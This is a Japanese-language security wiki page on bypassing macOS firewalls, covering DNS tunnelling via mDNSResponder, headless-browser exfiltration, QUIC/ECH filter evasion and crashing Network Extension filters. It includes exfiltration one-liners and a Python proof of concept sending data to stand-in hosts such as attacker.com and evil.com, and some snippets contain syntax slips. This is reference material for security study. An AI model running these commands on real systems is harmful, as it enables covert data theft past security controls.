# macOS Firewallのバイパス

{{#include ../../banners/hacktricks-training.md}}

## 発見されたtechnique

以下のtechniqueは、一部のmacOS firewall appで機能することが確認されています。

### whitelist名の悪用

- 例えば、**`launchd`**のような、よく知られたmacOS processの名前でmalwareを呼び出す

### Synthetic Click

- firewallがuserにpermissionを求めた場合、malwareに**allowをクリック**させる

### **Apple signed binariesを使用する**

- **`curl`**など。また、**`whois`**なども使用できる

### よく知られたApple domain

firewallが**`apple.com`**や**`icloud.com`**など、よく知られたApple domainへのconnectionを許可している可能性があります。また、iCloudをC2として使用できる可能性があります。

### Generic Bypass

firewallをバイパスするために試せるアイデア

### 許可されたtrafficを確認する

許可されたtrafficを把握すると、whitelistに登録されている可能性のあるdomainや、アクセスが許可されているapplicationを特定するのに役立ちます
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abusing DNS

macOSでは、プロセスがDNSサーバーと直接通信することはありません。名前解決は **XPC** 経由で、Apple署名済みのシステムデーモンである **`mDNSResponder`**（`/usr/sbin/mDNSResponder`）によって仲介されます。そのため、マシン上のすべての名前解決は、それを要求したプロセスではなく、**`mDNSResponder` からのトラフィック**としてホスト外へ送信されます。したがって、ファイアウォールはこのデーモンを無条件に信頼する傾向があります。これを拒否すると、システム全体の名前解決が壊れるためです。<sup>[[1]](#references)</sup>

そのため、ファイアウォールがマルウェア自身のソケットをブロックしている場合でも、DNSは開いたままのチャネルになります。<sup>[[1]](#references)</sup>

1. マルウェアが`evil.com`への接続を試みます。**自身の**外向き接続はファイアウォールによって検査され、**ブロック**されます。
2. 代わりにマルウェアは、XPC経由で`mDNSResponder`に`evil.com`の**名前解決**を要求します。
3. ファイアウォールは結果として生成されたクエリを検査しますが、信頼されたApple署名済みのリゾルバーが送信元であることを確認し、**許可**します。
4. クエリはDNSサーバーに到達します。さらに、攻撃者が`evil.com`の権威DNSサーバーを運用していれば、通信の両端を制御できます。

攻撃者はそのゾーンを所有しているため、「接続」は一切必要ありません。データは**問い合わせるラベル**（例：`<encoded-chunk>.evil.com`）の内部に隠して外部へ送信し、コマンドは**応答レコード**（TXT、A、CNAME…）の内部に含めて返せます。これは、完全にホワイトリスト登録されたプロセス上で動作する、classic DNS tunnellingです。

権限のないプロセスでもデーモンを直接操作できるため、次の方法でこの経路が開いていることを簡単に確認できます。
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Browser apps経由

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### process injection による方法

**inject code into a process** that is allowed to connect to any server できる場合、firewall の保護を bypass できます:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## 最近の macOS firewall bypass 脆弱性（2023-2025）

### Web content filter（Screen Time）の bypass – **CVE-2024-44206**
2024年7月、Apple は Screen Time の parental controls で使用される system-wide の「Web content filter」を無効化できる、Safari/WebKit の critical bug を patch しました。
特別に細工された URI（例えば、double URL-encoded の「://」を含むもの）は Screen Time ACL では認識されませんが、WebKit では受け入れられるため、request は filter を通過せずに送信されます。そのため、URL を開くことができるあらゆる process（sandboxed または unsigned code を含む）が、user または MDM profile によって明示的に block された domain に到達できます。<sup>[[2]](#references)</sup>

Practical test（un-patched system）：
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### 初期の macOS 14「Sonoma」における Packet Filter（PF）ルール順序付けのバグ
macOS 14 の beta cycle 中、Apple は **`pfctl`** 周辺の userspace wrapper に regression を導入しました。
`quick` keyword（多くの VPN kill-switches で使用）を付けて追加されたルールが silently ignored され、VPN/firewall GUI が *blocked* と報告している場合でも traffic leak が発生しました。この bug は複数の VPN vendors によって確認され、RC 2（build 23A344）で修正されました。

Quick leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Apple署名済み helper services の悪用（legacy – pre-macOS 11.2）
macOS 11.2 より前では、**`ContentFilterExclusionList`** により、**`nsurlsessiond`** や App Store など約50個の Apple binary が、Network Extension framework を使用して実装されたすべての socket-filter firewall（LuLu、Little Snitch など）を bypass できました。
Malware は、excluded process を単純に spawn するか、そこへ code を inject して、すでに許可されている socket 経由で自身の traffic を tunnel できました。Apple は macOS 11.2 で exclusion list を完全に削除しましたが、upgrade できない system ではこの technique は依然として relevant です。<sup>[[3]](#references)</sup>

Example proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECHでNetwork Extensionのドメインフィルターを回避（macOS 12+）
NEFilter Packet/Data ProvidersはTLS ClientHelloのSNI/ALPNを基に動作します。**HTTP/3 over QUIC（UDP/443）**と**Encrypted Client Hello（ECH）**を使用すると、SNIは暗号化されたままとなり、NetExtはフローを解析できません。その結果、ホスト名ルールがfail-openになることが多く、malwareはDNSに触れることなくブロックされたドメインへ到達できます。<sup>[[5]](#references)</sup>

最小PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
QUIC/ECH がまだ有効な場合、これは容易な hostname-filter 回避経路になります。

### macOS 15 “Sequoia” Network Extension の不安定性（2024–2025）
初期の 15.0/15.1 ビルドでは、サードパーティ製の **Network Extension** フィルター（LuLu、Little Snitch、Defender、SentinelOne など）がクラッシュします。フィルターが再起動すると、macOS は flow rules を破棄し、多くの製品が fail-open になります。数千件の短い UDP flows をフィルターに送り続ける（または QUIC/ECH を強制する）ことで、クラッシュを繰り返し発生させ、GUI 上ではファイアウォールが稼働中と表示されたまま、C2/exfil のためのウィンドウを残せる可能性があります。<sup>[[4]](#references)</sup>

簡単な再現（安全な lab 環境）：
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## modern macOS 向け Tooling tips

1. GUI firewall が生成する現在の PF rules を確認します:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. すでに *outgoing-network* entitlement を保持している binaries を列挙します（piggy-backing に有用）:
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Objective-C/Swift で独自の Network Extension content filter を programmatically 登録します。
packets を local socket に転送する minimal rootless PoC は、Patrick Wardle の **LuLu** source code で利用できます。

## References

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: macOS Firewalls の作成と突破](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple web content filter bypass により blocked content への unrestricted access が可能に（CVE-2024-44206） - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple、Apps が Firewall security を bypass できる macOS feature を削除 - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [macOS Sequoia Update 後に Cybersecurity Products が停止 - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [network protection を使用して macOS から bad sites への connections を防止する - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
